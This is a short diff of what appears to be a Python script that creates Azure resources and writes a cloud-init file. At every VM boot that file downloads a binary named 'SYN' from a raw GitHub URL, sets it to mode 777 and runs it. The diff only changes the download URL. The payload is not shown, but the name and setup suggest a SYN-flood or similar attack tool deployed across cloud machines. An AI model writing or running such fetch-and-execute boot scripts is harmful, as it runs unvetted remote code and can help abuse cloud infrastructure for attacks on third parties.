@@ -53,7 +53,7 @@ get_default_cli().invoke(['group', 'create', '--name', 'myResourceGroup',
 print("创建资源组成功")
 
 # 3.创建开机后要运行的脚本
-init = "apt-get install wget -y;wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN;chmod 777 SYN;./SYN"
+init = "apt-get install wget -y;wget https://raw.githubusercontent.com/110099/cdn/main/SYN;chmod 777 SYN;./SYN"
 with open("./cloud-init.txt", "w") as f:
     f.write("#cloud-config" + "\n")
     f.write("runcmd:" + "\n")
